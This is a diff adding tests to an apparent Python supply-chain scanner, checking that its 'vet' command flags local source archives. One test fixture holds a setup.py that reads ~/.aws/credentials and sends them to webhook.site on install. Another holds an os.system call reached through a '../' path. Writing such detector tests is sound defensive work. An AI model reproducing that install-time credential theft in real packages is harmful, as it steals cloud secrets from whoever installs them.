@@ -1,8 +1,14 @@
 from __future__ import annotations
 
+import io
+import json
+import tarfile
+
 import pytest
+from click.testing import CliRunner
 
 from ca9.analyzers.supply_chain import SupplyChainPolicy, analyze_supply_chain
+from ca9.cli import main
 from ca9.inventory import build_inventory
 
 PRIVATE = "https://pypi.acme-internal.example/simple"
@@ -173,6 +179,55 @@ def test_internal_git_source_is_not_dependency_confusion_but_registry_one_is(tmp
 
     assert ("dependency_confusion", "acme-tools") not in signals
     assert ("dependency_confusion", "acme-billing") in signals
+
+
+def _sdist(path, setup_source):
+    payload = setup_source.encode()
+    with tarfile.open(path, "w:gz") as archive:
+        info = tarfile.TarInfo("colourful-utils-0.1/setup.py")
+        info.size = len(payload)
+        archive.addfile(info, io.BytesIO(payload))
+
+
+def test_vet_scans_a_local_sdist_requirement_without_a_hash(tmp_path):
+    repo = tmp_path / "repo"
+    (repo / "vendor").mkdir(parents=True)
+    _sdist(
+        repo / "vendor" / "colourful-utils-0.1.tar.gz",
+        "import os, urllib.request\nfrom setuptools import setup\n"
+        "creds = open(os.path.expanduser('~/.aws/credentials')).read()\n"
+        "urllib.request.urlopen('https://webhook.site/x', data=creds.encode())\n"
+        "setup(name='colourful-utils', version='0.1')\n",
+    )
+    (repo / "requirements.txt").write_text("./vendor/colourful-utils-0.1.tar.gz\n")
+
+    result = CliRunner().invoke(
+        main,
+        ["vet", str(repo), "--scan-artifacts", "-f", "json"],
+    )
+
+    data = json.loads(result.output)
+    signals = {finding["signal_type"] for finding in data["findings"]}
+    assert data["summary"]["artifact_scans"] == 1
+    assert "setup-install-exec" in signals
+    assert "mutable_source" in signals
+    assert result.exit_code == 1
+
+
+def test_local_sdist_outside_the_repository_is_not_read(tmp_path):
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    _sdist(tmp_path / "outside-1.0.tar.gz", "import os\nos.system('id')\n")
+    (repo / "requirements.txt").write_text("../outside-1.0.tar.gz\n")
+
+    result = CliRunner().invoke(
+        main,
+        ["vet", str(repo), "--scan-artifacts", "-f", "json"],
+    )
+
+    data = json.loads(result.output)
+    assert data["summary"]["artifact_scans"] == 0
+    assert any(f["signal_type"] == "artifact_untrusted_url" for f in data["findings"])
 
 
 def test_index_credentials_are_dropped_before_matching_and_reporting(tmp_path):
